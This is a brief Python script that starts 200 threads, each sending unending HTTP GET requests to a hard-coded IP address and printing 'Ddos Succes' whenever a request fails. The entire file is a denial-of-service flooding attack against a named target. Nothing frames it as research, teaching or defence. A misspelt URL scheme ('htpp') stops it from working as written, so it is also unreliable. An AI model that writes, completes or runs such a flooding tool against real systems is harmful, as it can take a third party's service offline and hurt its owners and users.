import threading
import requests

url= "htpp://148.222.71.12"
THREADS = 200

def attck():
    while True:
       try:
           response = requests.get(url)
           print(f"sent request : {response.status_code}")
       except requests.exceptions.RequestException as e:
           print(f"Ddos Succes: {e}")

for _ in range(THREADS):
    thread = threading.Thread(target=attck)
    thread.start()










